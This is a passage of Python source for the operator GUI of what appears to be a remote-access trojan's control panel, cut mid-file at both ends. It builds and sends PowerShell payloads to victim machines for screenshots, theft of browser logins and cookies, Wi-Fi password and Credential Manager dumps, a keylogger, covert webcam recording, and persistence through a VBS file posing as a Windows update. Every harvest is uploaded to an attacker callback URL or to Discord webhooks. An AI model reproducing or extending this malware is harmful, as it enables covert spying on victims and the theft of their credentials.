            insertbackground=self.TERM_FG,
            selectbackground=self.ACCENT, borderwidth=0)
        vsb.config(command=self._term.yview)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self._term.pack(fill=tk.BOTH, expand=True)
        self._term.tag_config("out", foreground=self.TERM_FG)
        self._term.tag_config("sys", foreground=self.CYAN)
        self._term.tag_config("err", foreground=self.RED)

    def _build_cmdbar(self, parent):
        bar = tk.Frame(parent, bg=self.PANEL,
                       highlightbackground="#2a2a5a", highlightthickness=1)
        bar.pack(fill=tk.X)
        self._prompt_lbl = tk.Label(
            bar, text="xploit> ",
            bg=self.PANEL, fg=self.ACCENT,
            font=("Consolas", 10, "bold"), padx=8, pady=8)
        self._prompt_lbl.pack(side=tk.LEFT)
        self._cmd_var = tk.StringVar()
        self._cmd_entry = tk.Entry(
            bar, textvariable=self._cmd_var,
            bg="#090914", fg=self.TERM_FG,
            insertbackground=self.TERM_FG,
            font=("Consolas", 10), relief=tk.FLAT, bd=0, highlightthickness=0)
        self._cmd_entry.pack(fill=tk.X, expand=True, side=tk.LEFT, padx=4, ipady=8)
        self._cmd_entry.bind("<Return>", lambda e: self._send_command())
        self._cmd_entry.bind("<Up>",     self._hist_up)
        self._cmd_entry.bind("<Down>",   self._hist_down)
        self._cmd_entry.focus_set()
        tk.Button(bar, text=" \u25b6 Send ", command=self._send_command,
                  bg=self.ACCENT, fg="#ffffff", activebackground="#9b4fff",
                  font=("Segoe UI", 10, "bold"), relief=tk.FLAT,
                  cursor="hand2", padx=14, pady=8).pack(side=tk.LEFT, padx=4)
        tk.Button(bar, text=" \u232b ", command=self._clear_terminal,
                  bg=self.BTN_BG, fg=self.DIM, activebackground=self.BTN_HOV,
                  font=("Segoe UI", 9), relief=tk.FLAT,
                  cursor="hand2", padx=8, pady=8).pack(side=tk.LEFT, padx=2)

    def _build_toolbar(self):
        bar = tk.Frame(self.root, bg="#0a0a14",
                       highlightbackground="#1a1a3a", highlightthickness=1)
        bar.pack(fill=tk.X, side=tk.BOTTOM)
        for cat, buttons in [
            ("RECON", [
                ("\U0001f4f7 Screenshot",  self.CYAN,   self._do_screenshot),
                ("\U0001f310 Harvest",     self.GREEN,  self._do_harvest),
                ("\u2b07 Download",        self.TEXT,   self._do_download),
                ("\U0001f511 Key\u25b6",   self.YELLOW, self._do_key_capture),
                ("\U0001f511 Key\u25a0",   self.ORANGE, self._do_exit_capture),
                ("\U0001f4f8 Pic",         self.CYAN,   self._do_pic),
            ]),
            ("LIVECAM", [
                ("\u25b6 Rec Start",       self.GREEN,  self._do_livecam_start),
                ("\u25a0\u2192Discord",    self.ORANGE, self._do_livecam_stop),
                ("\u25a0\u2192Local",      self.CYAN,   self._do_livecam_save),
            ]),
            ("DUMP", [
                ("\U0001f4bb OS",          self.CYAN,   self._do_dump_os),
                ("\U0001f4f6 WiFi",        self.CYAN,   self._do_dump_wifi),
                ("\U0001f510 Credman",     self.CYAN,   self._do_dump_credman),
                ("\U0001f4e6 Full Dump",   self.YELLOW, self._do_dump_all),
            ]),
            ("PERSIST", [
                ("\U0001f512 Install",     self.GREEN,  self._do_persist),
                ("\U0001f504 Upd URL",     self.CYAN,   self._do_persist_update_url),
                ("\U0001f5d1 Remove",      self.ORANGE, self._do_persist_rm),
                ("\U0001f480 Kill Agent",  self.RED,    self._do_kill_agent),
            ]),
        ]:
            row = tk.Frame(bar, bg="#0a0a14")
            row.pack(fill=tk.X, padx=6, pady=2)
            tk.Label(row, text=f"{cat}:", bg="#0a0a14", fg=self.DIM,
                     font=("Segoe UI", 7, "bold"),
                     width=8, anchor=tk.W).pack(side=tk.LEFT, padx=(0, 4))
            for label, fg, cmd in buttons:
                tk.Button(row, text=label, command=cmd,
                          bg=self.BTN_BG, fg=fg, activebackground=self.BTN_HOV,
                          activeforeground=fg, font=("Segoe UI", 8),
                          relief=tk.FLAT, cursor="hand2",
                          padx=8, pady=4).pack(side=tk.LEFT, padx=2)

    # ── Session management ────────────────────────────────────────────────────
    def _refresh_sessions(self):
        seen, unique = set(), []
        for s in SM.list_all():
            if isinstance(s, Session) and s.session_id not in seen:
                seen.add(s.session_id)
                unique.append(s)
        self._session_cache = unique
        self._sess_lb.delete(0, tk.END)
        for s in self._session_cache:
            is_off = (s.status == "Running" and s.last_seen > 0
                      and (time.time() - s.last_seen) > 12)
            status = "Offline" if is_off else s.status
            label  = f"  {s.session_id}  {s.hostname[:15]:<15}  [{status}]"
            self._sess_lb.insert(tk.END, label)
            color = (self.RED    if s.status == "Stopped"
                     else self.ORANGE if is_off else self.GREEN)
            self._sess_lb.itemconfig(tk.END, fg=color)

    def _schedule_refresh(self):
        self._refresh_sessions()
        self.root.after(2000, self._schedule_refresh)

    def _on_sess_select(self, _e=None):
        sel = self._sess_lb.curselection()
        if not sel: return
        idx = sel[0]
        if idx < len(self._session_cache):
            s = self._session_cache[idx]
            self._selected_sid = s.session_id
            is_off = s.last_seen > 0 and (time.time() - s.last_seen) > 12
            status = "Offline" if is_off else s.status
            self._sess_status.config(
                text=f"{s.session_id}  {s.hostname}/{s.username}  [{status}]")

    def _selected_session(self) -> Optional[Session]:
        return SM.get(self._selected_sid) if self._selected_sid else None

    def _connect_session(self):
        global ACTIVE_SESSION_ID
        s = self._selected_session()
        if s is None:
            self.log_err("[-] No session selected."); return
        if s.status == "Stopped":
            self.log_err(f"[-] {s.session_id} is stopped."); return
        ACTIVE_SESSION_ID = s.session_id
        self._update_prompt(s)
        self.log_sys(f"[+] Connected to {s.session_id} ({s.hostname} / {s.username})")

    def _detach_session(self):
        global ACTIVE_SESSION_ID
        if ACTIVE_SESSION_ID:
            self.log_sys(f"[*] Detached from {ACTIVE_SESSION_ID}. Session remains active.")
            ACTIVE_SESSION_ID = None
        else:
            self.log_err("[-] No active session.")
        self._update_prompt(None)

    def _stop_session(self):
        global ACTIVE_SESSION_ID
        s = self._selected_session()
        if s is None: self.log_err("[-] No session selected."); return
        if s.status == "Stopped": self.log_sys(f"[*] {s.session_id} already stopped."); return
        target_sid  = s.session_id
        prev_active = ACTIVE_SESSION_ID
        ACTIVE_SESSION_ID = target_sid
        def _do():
            global ACTIVE_SESSION_ID
            _send("Stop-Process -Id $PID -Force", timeout=5.0)
            SM.stop(target_sid)
            self.log_sys(f"[+] Session {target_sid} stopped.")
            ACTIVE_SESSION_ID = prev_active if (prev_active and prev_active != target_sid) else None
            if ACTIVE_SESSION_ID is None:
                self.root.after_idle(lambda: self._update_prompt(None))
            self.root.after_idle(self._refresh_sessions)
        self._thread(_do)

    def _kill_all(self):
        if not messagebox.askyesno("Kill All",
                                   "Kill ALL running agents and clear the session store?",
                                   icon="warning", parent=self.root): return
        def _do():
            global ACTIVE_SESSION_ID
            count = SM.kill_all()
            ACTIVE_SESSION_ID = None
            self.root.after_idle(self._refresh_sessions)
            self.root.after_idle(lambda: self._update_prompt(None))
            self.log_sys(f"[+] Killed {count} agent(s). Store cleared." if count
                         else "[*] No running agents.")
        self._thread(_do)

    def _clear_sessions(self):
        global ACTIVE_SESSION_ID
        count = SM.clear_all()
        ACTIVE_SESSION_ID = None
        self._update_prompt(None)
        self._refresh_sessions()
        self.log_sys(f"[+] Cleared {count} stale session entries.")

    def _update_prompt(self, session: Optional[Session]):
        if session is None:
            self._prompt_lbl.config(text="xploit> ", fg=self.ACCENT)
        else:
            self._prompt_lbl.config(text=f"PS {session.cwd}> ", fg=self.CYAN)

    # ── Command bar ────────────────────────────────────────────────────────────
    def _send_command(self):
        cmd = self._cmd_var.get().strip()
        if not cmd: return
        self._cmd_var.set("")
        if not self._cmd_history or self._cmd_history[-1] != cmd:
            self._cmd_history.append(cmd)
        self._hist_idx = -1
        self.log_sys(f"> {cmd}")
        self._dispatch(cmd)

    def _dispatch(self, cmd: str):
        c = cmd.lower()
        if c == "session-exit":                       self._detach_session(); return
        if c == "list-sessions":
            for s in self._session_cache:
                is_off = s.last_seen > 0 and (time.time() - s.last_seen) > 12
                self.log(f"  {s.session_id}  {s.hostname}/{s.username}  "
                         f"{s.ip}  [{'Offline' if is_off else s.status}]")
            return
        if c == "kill-agent":          self._do_kill_agent(); return
        if c == "screenshot":           self._do_screenshot(); return
        if c == "harvest-browsers":     self._do_harvest(); return
        if c == "key-capture":          self._do_key_capture(); return
        if c == "exit-capture":         self._do_exit_capture(); return
        if c == "livecam-start":        self._do_livecam_start(); return
        if c == "livecam-stop":         self._do_livecam_stop(); return
        if c == "livecam-save":         self._do_livecam_save(); return
        if c == "pic":                  self._do_pic(); return
        if c == "persist":              self._do_persist(); return
        if c == "persist-update-url":   self._do_persist_update_url(); return
        if c in ("persist-rm", "persist-remove"): self._do_persist_rm(); return
        if c == "dump-os":              self._do_dump_os(); return
        if c == "dump-wifi":            self._do_dump_wifi(); return
        if c == "dump-credman":         self._do_dump_credman(); return
        if c == "dump-all":             self._do_dump_all(); return
        if c.startswith("download "):   self._do_download(cmd.split(" ", 1)[1].strip()); return
        if c.startswith("connect "):
            self._selected_sid = cmd.split(" ", 1)[1].strip().upper()
            self._connect_session(); return
        # Passthrough → active agent
        act = _active_session()
        if act is None:
            self.log_err("[-] No active session — use Connect first."); return
        def _do():
            act.current_task = cmd
            act.task_result  = None
            result = wait_for_result(act)
            if result: self.log(result)
            upd = SM.get(ACTIVE_SESSION_ID) if ACTIVE_SESSION_ID else None
            if upd: self.root.after_idle(lambda: self._update_prompt(upd))
        self._thread(_do)

    def _hist_up(self, _e=None):
        if not self._cmd_history: return
        self._hist_idx = (len(self._cmd_history) - 1 if self._hist_idx < 0
                          else max(0, self._hist_idx - 1))
        self._cmd_var.set(self._cmd_history[self._hist_idx])
        self._cmd_entry.icursor(tk.END)

    def _hist_down(self, _e=None):
        if not self._cmd_history or self._hist_idx < 0: return
        if self._hist_idx < len(self._cmd_history) - 1:
            self._hist_idx += 1
            self._cmd_var.set(self._cmd_history[self._hist_idx])
        else:
            self._hist_idx = -1; self._cmd_var.set("")
        self._cmd_entry.icursor(tk.END)

    def _clear_terminal(self):
        self._term.config(state=tk.NORMAL)
        self._term.delete(1.0, tk.END)
        self._term.config(state=tk.DISABLED)

    # ── Utilities ───────────────────────────────────────────────────────────────
    def _thread(self, fn, *args):
        threading.Thread(target=fn, args=args, daemon=True).start()

    def _webhook_dialog(self, title: str) -> Optional[str]:
        whu = simpledialog.askstring(title, "Discord webhook URL:", parent=self.root)
        if not whu: return None
        whu = whu.strip()
        if not whu.startswith("https://discord.com/api/webhooks/"):
            messagebox.showerror("Invalid", "Not a valid Discord webhook URL.", parent=self.root)
            return None
        return whu

    def _need_session(self) -> bool:
        if _active_session() is None:
            self.log_err("[-] No active session — use Connect first.")
            return False
        return True

    # ── Agent command handlers ─────────────────────────────────────────────────
    def _do_screenshot(self):
        if not self._need_session(): return
        url = self.callback_url
        ps = (
            "$t=\"$env:TEMP\\sc$(Get-Date -Format 'yyyyMMddHHmmss').png\";"
            "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
            "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
            "$bmp=New-Object System.Drawing.Bitmap($s.Width,$s.Height);"
            "$g=[System.Drawing.Graphics]::FromImage($bmp);"
            "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);"
            "$g.Dispose();"
            "$bmp.Save($t,[System.Drawing.Imaging.ImageFormat]::Png);"
            "$bmp.Dispose();"
            "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
            f"try{{$wcu.UploadFile('{url}/upload',$t)}}catch{{}};$wcu.Dispose();"
            "Remove-Item $t -Force;"
            "Write-Output '[+] Screenshot uploaded.'"
        )
        self.log_sys("[*] Capturing screen...")
        self._thread(lambda: self.log(_send(ps)))

    def _do_harvest(self):
        if not self._need_session(): return
        url = self.callback_url
        ps = (
            "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
            "$d=\"$env:TEMP\\harv_$ts\";"
            "New-Item -ItemType Directory $d -Force|Out-Null;"
            "cmdkey /list|Out-File \"$d\\credman.txt\" -Encoding UTF8;"
            "$w=@();netsh wlan show profiles|Select-String 'All User Profile'|ForEach-Object{"
            "$n=($_ -split ':',2)[1].Trim();"
            "$raw=(& cmd /c \"netsh wlan show profile name=`\"$n`\" key=clear\") -join \"`n\";"
            "$key=if($raw -match 'Key Content\\s+:\\s+(.+)'){$Matches[1].Trim()}else{'(none)'};"
            "$w+=\"$n - $key\"};" + "\n"
            "$w|Out-File \"$d\\wifi.txt\" -Encoding UTF8;"
            "$bd=\"$d\\browsers\";New-Item -ItemType Directory $bd -Force|Out-Null;"
            "@{Chrome=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";"
            "Edge=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\"}.GetEnumerator()|ForEach-Object{"
            "if(Test-Path $_.Value){"
            "$dst=\"$bd\\$($_.Key)\";New-Item -ItemType Directory $dst -Force|Out-Null;"
            "foreach($f in @('Login Data','Cookies','History','Web Data')){"
            "$fp=\"$($_.Value)\\$f\";if(Test-Path $fp){Copy-Item $fp \"$dst\\$f\" -Force}}}};"
            "$zip=\"$env:TEMP\\harv_$ts.zip\";"
            "Compress-Archive -Path $d -DestinationPath $zip -Force;"
            "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
            f"try{{$wcu.UploadFile('{url}/upload',$zip)}}catch{{}};$wcu.Dispose();"
            "Remove-Item $d -Recurse -Force -EA 0;Remove-Item $zip -Force -EA 0;"
            "Write-Output '[+] Harvest zip uploaded \u2192 ./exfil/'"
        )
        self.log_sys("[*] Harvesting browser/WiFi/cred data...")
        self._thread(lambda: self.log(_send(ps, timeout=90.0)))

    def _do_download(self, filepath: str = ""):
        if not self._need_session(): return
        if not filepath:
            filepath = simpledialog.askstring("Download File", "Remote file path:", parent=self.root)
            if not filepath: return
            filepath = filepath.strip()
        act = _active_session()
        if act is None: return
        s = act
        if ":" in filepath or filepath.startswith("\\\\"):
            tf = filepath
        else:
            sep = "" if s.cwd.endswith("\\") else "\\"
            tf = f"{s.cwd}{sep}{filepath}"
        url = self.callback_url
        sf  = tf.replace("'", "''")
        ps  = (
            f"$fp='{sf}';"
            "if(Test-Path $fp){$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
            f"try{{$wcu.UploadFile('{url}/upload',$fp)}}catch{{}};$wcu.Dispose();"
            f"Write-Output \"[+] Sent: $fp\"}}"
            f"else{{Write-Output \"[-] Not found: $fp\"}}"
        )
        self.log_sys(f"[*] Downloading: {tf}")
        self._thread(lambda: self.log(_send(ps)))

    def _do_key_capture(self):
        if not self._need_session(): return
        ps = (
            "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
            "$log=\"$env:TEMP\\kl_$ts.txt\";"
            "$sb={"
            "param($lp);"
            "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;"
            "public class KL2{"
            "[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int k);"
            "[DllImport(\"user32.dll\")]public static extern short GetKeyState(int k);}' -EA 0;"
            "$sm=@{48=')';49='!';50='@';51='#';52='$';53='%';54='^';55='&';56='*';57='(';"
            "186=':';187='+';188='<';189='_';190='>';191='?';192='~';219='{';220='|';221='}';222='\"'};"
            "$nm=@{186=';';187='=';188=',';189='-';190='.';191='/';192='`';219='[';220='\\\\';221=']';222=\"'\"};"
            "while($true){Start-Sleep -Milliseconds 30;"
            "for($i=8;$i -le 222;$i++){if([KL2]::GetAsyncKeyState($i) -band 0x0001){"
            "$sh=[KL2]::GetKeyState(16) -band 0x8000;"
            "$ca=[KL2]::GetKeyState(20) -band 0x0001;"
            "$ch=$null;"
            "if($i -eq 13){$ch=\"\\r\\n\"}"
            "elseif($i -eq 32){$ch=' '}"
            "elseif($i -eq 8){$ch='[BS]'}"
            "elseif($i -eq 9){$ch='[TAB]'}"
            "elseif($i -eq 46){$ch='[DEL]'}"
            "elseif($i -ge 65 -and $i -le 90){$ch=if($sh -bxor $ca){[char]$i}else{[char]($i+32)}}"
            "elseif($i -ge 48 -and $i -le 57){$ch=if($sh){$sm[$i]}else{[char]$i}}"
            "elseif($i -ge 96 -and $i -le 105){$ch=[char]($i-48)}"
            "elseif($sm.ContainsKey($i)){$ch=if($sh){$sm[$i]}else{$nm[$i]}};"
            "if($ch -ne $null){[System.IO.File]::AppendAllText($lp,[string]$ch)}}}}};"
            "$j=Start-Job -ScriptBlock $sb -ArgumentList $log;"
            "\"$($j.Id)|$log\"|Set-Content \"$env:TEMP\\kl_job.txt\";"
            "Write-Output \"[+] Keylogger started (Job $($j.Id)). Type exit-capture to stop.\""
        )
        self.log_sys("[*] Starting background keylogger...")
        self._thread(lambda: self.log(_send_encoded(ps, timeout=25.0)))

    def _do_exit_capture(self):
        if not self._need_session(): return
        url = self.callback_url
        ps = (
            "if(-not(Test-Path \"$env:TEMP\\kl_job.txt\")){Write-Output '[-] No keylogger running.'}else{"
            "$parts=(Get-Content \"$env:TEMP\\kl_job.txt\").Split('|');"
            "$jId=[int]$parts[0];$lpath=$parts[1];"
            "Stop-Job -Id $jId -EA 0;Remove-Job -Id $jId -Force -EA 0;"
            "Remove-Item \"$env:TEMP\\kl_job.txt\" -Force -EA 0;"
            "if(Test-Path $lpath){"
            "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
            f"try{{$wcu.UploadFile('{url}/upload',$lpath)}}catch{{}};$wcu.Dispose();"
            "Remove-Item $lpath -Force -EA 0;"
            "Write-Output '[+] Keylog uploaded \u2192 ./exfil/'"
            "}else{Write-Output '[-] No log file found.'}}"
        )
        self.log_sys("[*] Stopping keylogger and uploading log...")
        self._thread(lambda: self.log(_send(ps, timeout=30.0)))

    def _do_livecam_start(self):
        if not self._need_session(): return
        b64 = _LC_B64
        ps = (
            "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
            "$avi=\"$env:TEMP\\lc_$ts.avi\";"
            "$flag=\"$env:TEMP\\lc_stop.flag\";"
            "Remove-Item $flag -EA 0;"
            "$sp=\"$env:TEMP\\lc_cap.ps1\";"
            f"[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64}'))|Set-Content $sp -Encoding Unicode;"
            "$proc=Start-Process \"$env:windir\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" -ArgumentList \"-NoP -NonI -STA -ExecutionPolicy Bypass -File `\"$sp`\" `\"$avi`\" `\"$flag`\"\" -PassThru -WindowStyle Hidden;"
            "\"$($proc.Id)|$avi\"|Set-Content \"$env:TEMP\\lc_job.txt\";"
            "Write-Output \"[+] Recording started (PID $($proc.Id)). Use livecam-stop or livecam-save.\""
        )
        self.log_sys("[*] Starting webcam recording on target...")
        self._thread(lambda: self.log(_send(ps, timeout=20.0)))

    def _do_livecam_stop(self):
        if not self._need_session(): return
        whu = self._webhook_dialog("Livecam \u2192 Discord")
        if not whu: return
        ps = (
            _DISCORD_UPLOAD +
            "if(-not(Test-Path \"$env:TEMP\\lc_job.txt\")){Write-Output '[-] No livecam session.'}else{"
            "$parts=(Get-Content \"$env:TEMP\\lc_job.txt\").Split('|');"
            "$cpid=[int]$parts[0];$avi=$parts[1];"
            "'stop'|Set-Content \"$env:TEMP\\lc_stop.flag\";"
            "Start-Sleep -Seconds 6;"
            "$pp=Get-Process -Id $cpid -EA 0;"
            "if($pp -and -not $pp.WaitForExit(10000)){Stop-Process -Id $cpid -Force -EA 0;Start-Sleep -Seconds 2};"
            "Start-Sleep -Seconds 1;"
            "Remove-Item \"$env:TEMP\\lc_job.txt\",\"$env:TEMP\\lc_stop.flag\",\"$env:TEMP\\lc_cap.ps1\" -Force -EA 0;"
            "if(Test-Path $avi){"
            "$szMB=[Math]::Round((Get-Item $avi).Length/1MB,2);"
            f"_DU '{whu}' $avi;"
            "Remove-Item $avi -Force -EA 0;"
            "Write-Output \"[+] Recording uploaded to Discord ($szMB MB).\""
            "}else{Write-Output '[-] AVI file not found.'}}"
        )
        self.log_sys("[*] Stopping recording and uploading to Discord...")
        self._thread(lambda: self.log(_send(ps, timeout=60.0)))

    def _do_livecam_save(self):
        if not self._need_session(): return
        url = self.callback_url
        ps = (
            "if(-not(Test-Path \"$env:TEMP\\lc_job.txt\")){Write-Output '[-] No livecam session.'}else{"
            "$parts=(Get-Content \"$env:TEMP\\lc_job.txt\").Split('|');"
            "$cpid=[int]$parts[0];$avi=$parts[1];"
            "'stop'|Set-Content \"$env:TEMP\\lc_stop.flag\";"
            "Start-Sleep -Seconds 6;"
            "$pp=Get-Process -Id $cpid -EA 0;"
            "if($pp -and -not $pp.WaitForExit(10000)){Stop-Process -Id $cpid -Force -EA 0;Start-Sleep -Seconds 2};"
            "Start-Sleep -Seconds 1;"
            "Remove-Item \"$env:TEMP\\lc_job.txt\",\"$env:TEMP\\lc_stop.flag\",\"$env:TEMP\\lc_cap.ps1\" -Force -EA 0;"
            "if(Test-Path $avi){"
            "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
            f"try{{$wcu.UploadFile('{url}/upload',$avi)}}catch{{}};$wcu.Dispose();"
            "Remove-Item $avi -Force -EA 0;"
            "Write-Output '[+] Recording saved \u2192 ./recordings/'"
            "}else{Write-Output '[-] AVI file not found.'}}"
        )
        self.log_sys("[*] Stopping recording and saving locally...")
        self._thread(lambda: self.log(_send(ps, timeout=60.0)))

    def _do_pic(self):
        if not self._need_session(): return
        whu_raw = simpledialog.askstring(
            "Webcam Pic",
            "Discord webhook URL (leave empty to save locally):",
            parent=self.root)
        whu_raw = whu_raw.strip() if whu_raw else ""
        url = self.callback_url
        b64 = _PIC_B64
        common = (
            "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
            "$bmp=\"$env:TEMP\\pic_$ts.bmp\";"
            "$done=\"$env:TEMP\\pic_done.flag\";"
            "$png=\"$env:TEMP\\pic_$ts.png\";"
            "Remove-Item $done -Force -EA 0;"
            "$sp=\"$env:TEMP\\pic_cap.ps1\";"
            f"[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64}'))|Set-Content $sp -Encoding Unicode;"
            f"Start-Process \"$env:windir\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" -ArgumentList \"-NoP -NonI -STA -ExecutionPolicy Bypass -File `\"$sp`\" `\"$bmp`\" `\"$done`\"\" -WindowStyle Hidden;"
            "$i=0;while(-not(Test-Path $done) -and $i -lt 40){Start-Sleep -Milliseconds 500;$i++};"
            "Start-Sleep -Milliseconds 500;"
            "if((Test-Path $bmp) -and (Get-Item $bmp).Length -gt 0){"
            "Add-Type -AssemblyName System.Drawing;"
            "$img=[System.Drawing.Image]::FromFile($bmp);"
            "$img.Save($png,[System.Drawing.Imaging.ImageFormat]::Png);"
            "$img.Dispose();"
        )
        if whu_raw:
            ps = (
                _DISCORD_UPLOAD + common +
                f"_DU '{whu_raw}' $png;"
                "Remove-Item $bmp,$png,$done,$sp -Force -EA 0;"
                "Write-Output '[+] Photo sent to Discord.'"
                "}else{Write-Output '[-] No camera \u2014 check driver is installed.'}"
            )
        else:
            ps = (
                common +
                "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
                f"try{{$wcu.UploadFile('{url}/upload',$png)}}catch{{}};$wcu.Dispose();"
                "Remove-Item $bmp,$png,$done,$sp -Force -EA 0;"
                "Write-Output '[+] Photo saved \u2192 ./images/'"
                "}else{Write-Output '[-] No camera \u2014 check driver is installed.'}"
            )
        self.log_sys("[*] Activating camera (2 s warm-up)...")
        self._thread(lambda: self.log(_send_encoded(ps, timeout=30.0)))

    def _do_dump_os(self):
        if not self._need_session(): return
        whu = self._webhook_dialog("Dump OS Info")
        if not whu: return
        ps = (
            _DISCORD_TEXT +
            "$osi=Get-WmiObject Win32_OperatingSystem;"
            "$cpu=(Get-WmiObject Win32_Processor|Select-Object -First 1).Name;"
            "$ram=[Math]::Round($osi.TotalVisibleMemorySize/1MB,2);"
            "$dsk=Get-PSDrive C;"
            "$ips=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{$_.IPAddress -ne '127.0.0.1'}).IPAddress -join ', ';"
            "$msg='__**OS Dump: '+$env:COMPUTERNAME+'**__'+\"`n\"+'```'+\"`n\";"
            "$msg+='Host    : '+$env:COMPUTERNAME+\"`n\";"
            "$msg+='User    : '+$env:USERNAME+' ('+$env:USERDOMAIN+')'+\"`n\";"
            "$msg+='OS      : '+$osi.Caption+' '+$osi.OSArchitecture+\"`n\";"
            "$msg+='CPU     : '+$cpu+\"`n\";"
            "$msg+='RAM     : '+$ram+' GB'+\"`n\";"
            "$msg+='Disk    : '+[Math]::Round($dsk.Used/1GB,1)+' GB used / '+[Math]::Round($dsk.Free/1GB,1)+' GB free'+\"`n\";"
            "$msg+='IPs     : '+$ips+\"`n\"+'```';"
            f"_DS '{whu}' $msg;"
            "Write-Output '[+] OS info sent to Discord.'"
        )
        self.log_sys("[*] Dumping OS info to Discord...")
        self._thread(lambda: self.log(_send(ps, timeout=30.0)))

    def _do_dump_wifi(self):
        if not self._need_session(): return
        whu = self._webhook_dialog("Dump WiFi Passwords")
        if not whu: return
        ps = (
            _DISCORD_TEXT +
            "$prfs=netsh wlan show profiles|Select-String 'All User Profile';"
            "if(-not $prfs){Write-Output '[-] No WiFi profiles.'}else{"
            "$msg='__**WiFi Passwords: '+$env:COMPUTERNAME+'**__'+\"`n\";"
            "$prfs|ForEach-Object{"
            "$n=($_ -split ':',2)[1].Trim();"
            "$raw=(& cmd /c (\"netsh wlan show profile name=`\"`\"$n`\"`\" key=clear\")) -join \"`n\";"
            "$key=if($raw -match 'Key Content\\s+:\\s+(.+)'){$Matches[1].Trim()}else{'(none)'};"
            "$msg+=\"`n**\"+$n+\"**`nPassword: ``\"+$key+\"``\"+\"`n\"};"
            f"_DS '{whu}' $msg;"
            "Write-Output '[+] WiFi data sent to Discord.'}"
        )
        self.log_sys("[*] Dumping WiFi passwords to Discord...")
        self._thread(lambda: self.log(_send(ps, timeout=60.0)))

    def _do_dump_credman(self):
        if not self._need_session(): return
        whu = self._webhook_dialog("Dump Credential Manager")
        if not whu: return
        ps = (
            _DISCORD_TEXT +
            "$raw=(cmdkey /list) -join \"`n\";"
            "$msg='__**Credential Manager: '+$env:COMPUTERNAME+'**__'+\"`n\"+'```'+\"`n\"+$raw+\"`n\"+'```';"
            f"_DS '{whu}' $msg;"
            "Write-Output '[+] Credential Manager sent to Discord.'"
        )
        self.log_sys("[*] Dumping Credential Manager to Discord...")
        self._thread(lambda: self.log(_send(ps, timeout=30.0)))

    def _do_dump_all(self):
        if not self._need_session(): return
        whu = self._webhook_dialog("Full Dump \u2192 Discord")
        if not whu: return
        ps = (
            _DISCORD_UPLOAD +
            "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
            "$d=\"$env:TEMP\\dump_$ts\";"
            "New-Item -ItemType Directory $d -Force|Out-Null;"
            "$osi=Get-WmiObject Win32_OperatingSystem;"
            "$cpu=(Get-WmiObject Win32_Processor|Select-Object -First 1).Name;"
            "@('=== SYSTEM INFO ===',\"Host: $env:COMPUTERNAME\",\"User: $env:USERNAME\","
            "\"OS: $($osi.Caption)\",\"CPU: $cpu\","
            "\"RAM: $([Math]::Round($osi.TotalVisibleMemorySize/1MB,2)) GB\")"
            "|Out-File \"$d\\sysinfo.txt\" -Encoding UTF8;"
            "cmdkey /list|Out-File \"$d\\credman.txt\" -Encoding UTF8;"
            "$w=@();netsh wlan show profiles|Select-String 'All User Profile'|ForEach-Object{"
            "$n=($_ -split ':',2)[1].Trim();"
            "$raw=(& cmd /c \"netsh wlan show profile name=`\"$n`\" key=clear\") -join \"`n\";"
            "$key=if($raw -match 'Key Content\\s+:\\s+(.+)'){$Matches[1].Trim()}else{'(none)'};"
            "$w+= \"$n - $key\"};"
            "$w|Out-File \"$d\\wifi.txt\" -Encoding UTF8;"
            "$bd=\"$d\\browsers\";New-Item -ItemType Directory $bd -Force|Out-Null;"
            "@{Chrome=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";"
            "Edge=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\"}.GetEnumerator()|ForEach-Object{"
            "if(Test-Path $_.Value){"
            "$dst=\"$bd\\$($_.Key)\";New-Item -ItemType Directory $dst -Force|Out-Null;"
            "foreach($f in @('Login Data','Cookies','History')){$fp=\"$($_.Value)\\$f\";"
            "if(Test-Path $fp){Copy-Item $fp \"$dst\\$f\" -Force}}}};"
            "$zip=\"$env:TEMP\\dump_$ts.zip\";"
            "Compress-Archive -Path $d -DestinationPath $zip -Force;"
            "$szMB=[Math]::Round((Get-Item $zip).Length/1MB,2);"
            f"_DU '{whu}' $zip;"
            "Remove-Item $d -Recurse -Force -EA 0;Remove-Item $zip -Force -EA 0;"
            "Write-Output \"[+] Dump sent to Discord ($szMB MB).\""
        )
        self.log_sys("[*] Running full dump (30\u201390 s)...")
        self._thread(lambda: self.log(_send(ps, timeout=180.0)))

    def _do_persist(self):
        if not self._need_session(): return
        payload_cmd = generate_ps_payload(self.callback_url)
        safe_url    = self.callback_url.replace("'", "''")
        vbs_ps_cmd  = payload_cmd.replace('"', '""')
        vbs_content = f'CreateObject("WScript.Shell").Run "{vbs_ps_cmd}", 0, False'
        vbs_escaped = vbs_content.replace("'", "''")
        ps = (
            "$vd=\"$env:APPDATA\\WUpdate\";"
            "New-Item -ItemType Directory $vd -Force|Out-Null;"
            "$vp=\"$vd\\svc.vbs\";"
            f"Set-Content -Path $vp -Value '{vbs_escaped}' -Encoding ASCII;"
